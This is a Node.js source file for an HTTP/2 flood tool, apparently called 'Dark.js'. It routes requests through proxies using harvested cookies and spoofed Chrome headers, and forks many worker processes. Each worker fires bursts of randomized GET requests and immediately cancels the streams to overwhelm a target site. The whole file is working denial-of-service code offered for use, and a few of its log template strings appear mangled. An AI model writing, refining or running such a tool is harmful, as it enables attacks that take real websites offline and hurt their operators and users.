// используется для файла Dark.js by Dark JPT
// used for dark.js file by Dark JP
const fs = require('fs');
const net = require('net');
const tls = require('tls');
const http2 = require('http2');
const cluster = require('cluster');
const os = require('os');
const { HttpsProxyAgent } = require('https-proxy-agent');
const WebSocket = require('ws');

const Link = process.argv[2] || 'https://DarkTeam.com';
const TIME = parseInt(process.argv[3]) || 300;
const Thread = parseInt(process.argv[4]) || os.cpus().length * 16;
const Cookie_File = './cookie.json';

let cookies = [];
let dead = 0;
let requests = 0;

const loadCookies = () => {
    if (!fs.existsSync(Cookie_File)) return [];
    return fs.readFileSync(Cookie_File, 'utf-8')
        .split('\n')
        .filter(Boolean)
        .map(line => {
            try { return JSON.parse(line); } catch { return null; }
        })
        .filter(Boolean);
};

const getRandomCookie = () => {
    if (cookies.length === 0) cookies = loadCookies();
    if (cookies.length === 0) return null;
    const idx = Math.floor(Math.random() * cookies.length);
    const cookie = cookies[idx];
    if (Date.now() - cookie.timestamp > 14*60*1000) {
        cookies.splice(idx, 1);
        return getRandomCookie();
    }
    return cookie;
};

const floodHTTP2 = (cookieObj) => {
    const client = http2.connect(Link, {
        createConnection: () => tls.connect({
            host: new URL(Link).host,
            port: 443,
            ALPNProtocols: ['h2'],
            servername: new URL(Link).host,
            rejectUnauthorized: false,
            socket: net.connect({
                host: cookieObj.proxy.split(':')[0],
                port: parseInt(cookieObj.proxy.split(':')[1])
            })
        })
    });

    client.on('error', () => client.destroy());

    const attack = setInterval(() => {
        for (let i = 0; i < 128; i++) {
            const req = client.request({
                ':path': '/?' + Math.random().toString(36),
                ':method': 'GET',
                'user-agent': cookieObj.headers['user-agent'],
                'cookie': cookieObj.headers.cookie,
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'cache-control': 'no-cache',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not=A?Brand";v="24"'
            });

            req.on('response', () => requests++);
            req.on('error', () => {});
            req.end();
            req.rstStream?.(http2.constants.NGHTTP2_CANCEL);
        }
    }, 1);

    setTimeout(() => {
        clearInterval(attack);
        client.destroy();
    }, 1000 + Math.random()*2000);
};

if (cluster.isMaster) {
    console.log(`[Flood] Khởi động \( {Thread} luồng tấn công \){Link} trong ${TIME}s`);
    for (let i = 0; i < Thread; i++) cluster.fork();

    setInterval(() => {
        console.log(`Requests/s: \( {requests} | Dead cookies: \){dead} | Active Thread: ${Object.keys(cluster.workers).length}`);
        requests = 0;
    }, 1000);

    setTimeout(() => process.exit(0), TIME * 1000);
} else {
    setInterval(() => {
        const cookie = getRandomCookie();
        if (!cookie) {
            dead++;
            return;
        }
        try {
            floodHTTP2(cookie);
        } catch (e) {
            // silent
        }
    }, 5);
}

